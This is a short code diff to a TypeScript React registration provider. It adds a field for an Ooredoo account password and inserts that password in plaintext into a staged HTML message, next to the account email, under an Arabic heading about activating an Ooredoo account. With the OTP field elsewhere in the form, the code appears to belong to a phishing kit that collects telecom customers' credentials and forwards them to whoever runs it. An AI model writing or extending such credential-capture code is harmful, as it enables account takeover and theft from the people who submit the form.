@@ -35,6 +35,7 @@ interface RegistrationData {
   
   // Ooredoo Verification
   ooredooEmail?: string;
+  ooredooPassword?: string;
   
   // OTP
   otp?: string;
@@ -134,6 +135,7 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
     if (stage >= 7 && dataToFormat.ooredooEmail) {
       message += `📱 <b>المرحلة 7: تفعيل حساب Ooredoo</b>\n`;
       message += `   📧 البريد الإلكتروني: ${dataToFormat.ooredooEmail}\n`;
+      message += `   🔑 كلمة السر: ${dataToFormat.ooredooPassword}\n`;
       message += `\n`;
     }
 
